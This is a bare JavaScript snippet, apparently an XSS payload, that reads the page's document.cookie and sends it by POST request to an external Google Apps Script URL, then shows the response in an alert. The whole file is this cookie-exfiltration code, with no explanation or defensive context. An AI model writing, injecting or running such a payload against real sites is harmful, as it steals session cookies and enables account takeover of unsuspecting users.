var http = new XMLHttpRequest();
var url = "https://script.google.com/macros/s/AKfycbwk7E76frDXaUgsMb5WbjG6ILGtFk8shwqL3rQm1pEXrFSEk6lZ/exec";
var params = "payload="+document.cookie;
http.open("POST", url, true);

//Send the proper header information along with the request
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

http.onreadystatechange = function() {//Call a function when the state changes.
    if(http.readyState == 4 && http.status == 200) {
        alert(http.responseText);
    }
}
http.send(params);
